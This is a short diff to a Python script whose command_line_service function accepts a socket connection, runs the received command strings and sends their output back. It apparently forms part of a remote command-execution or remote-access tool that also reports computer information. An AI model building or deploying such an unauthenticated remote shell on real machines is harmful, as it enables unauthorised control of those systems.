@@ -142,17 +142,19 @@ def command_line_service(host, port):
         try:
             sock.listen(5)
             print('Server started.')
+            conn, addr = sock.accept()
+            print('Client connected IP:', addr)
 
             while 'connected':
-                conn, addr = sock.accept()
-                print('Client connected IP:', addr)
+
+
+                # NOT SENDING EVERYTHING, FIX TO SEND ALL THE INFORMATION AND THEN STOP
                 command = conn.recv(1024)
                 thread = Thread(target=run_command, args=(command,))
                 thread.start()
                 thread.join()
                 global result
                 conn.sendall(result)
-
         finally:
             conn.close()
 
@@ -165,6 +167,8 @@ def main():
     print(running_port)
     send_computer_information(running_port)
     # width, height = get_screen_width_height()
+
+    # Maybe run all functionalites on different threads
     # socket_listening("192.168.0.129", running_port)
     command_line_service("192.168.1.25", running_port)
 
